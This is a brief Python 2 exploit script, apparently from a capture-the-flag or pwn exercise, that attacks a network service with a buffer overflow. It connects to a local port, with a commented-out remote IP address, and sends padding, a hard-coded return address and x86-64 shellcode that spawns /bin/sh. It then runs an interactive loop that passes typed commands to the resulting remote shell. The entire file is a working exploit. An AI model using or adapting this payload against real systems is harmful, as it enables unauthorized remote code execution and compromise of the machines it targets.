import socket
import time
#0x4012AC

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(('222.182.106.193',11111))
s.connect(('127.0.0.1',4444))
buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x09\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x00\x56\x57\x48\x89\xe6\x0f\x05"

s.send('1111111122222222333333334444444455555555'+ '\xa3\x39\x4b\x00' + '\x00' * 4 + buf+'77777777888888889999999900000000')
time.sleep(2)

while True:
	s.send(raw_input("@") + '\n')
	time.sleep(2)
	print s.recv(1024)
